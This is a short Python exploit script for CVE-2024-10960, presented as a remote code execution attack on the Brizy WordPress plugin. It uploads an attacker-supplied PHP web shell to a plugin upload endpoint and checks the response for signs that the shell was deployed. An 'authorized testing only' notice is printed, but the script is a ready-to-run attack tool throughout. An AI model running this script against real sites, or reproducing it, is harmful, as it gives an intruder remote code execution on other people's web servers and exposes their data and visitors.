"""
CVE-2024-10960 – Remote Code Execution (RCE) Exploit
Brizy WordPress Plugin – Insecure File Upload

Description:
Exploits an insecure upload flaw to deploy a PHP shell on the target.
Only use on systems with explicit permission.
"""

import argparse
import requests
import os

def exploit(target_url, shell_path):
    if not os.path.exists(shell_path):
        print(f"[-] Shell file not found: {shell_path}")
        return

    print(f"[+] Target: {target_url}")
    print(f"[+] Uploading shell: {shell_path}")

    files = {'file': open(shell_path, 'rb')}
    upload_url = f"{target_url.rstrip('/')}/wp-content/plugins/brizy/cloudinary/upload.php"

    try:
        response = requests.post(upload_url, files=files, timeout=10)
        if response.status_code == 200:
            print("[+] Upload request sent successfully.")
            if "shell.php" in response.text or "http" in response.text:
                print("[+] Possible shell deployed!")
            else:
                print("[!] Response does not confirm shell deployment.")
        else:
            print(f"[-] Upload failed: HTTP {response.status_code}")
    except Exception as e:
        print(f"[ERROR] Exploit failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brizy WordPress RCE – CVE-2024-10960")
    parser.add_argument("--target", required=True, help="Target site URL (e.g., http://example.com)")
    parser.add_argument("--shell", required=True, help="Local path to PHP shell file")
    args = parser.parse_args()

    print("=== Ethical Use Notice ===")
    print("This exploit is for authorized testing only.")
    print("==========================")

    exploit(args.target, args.shell)
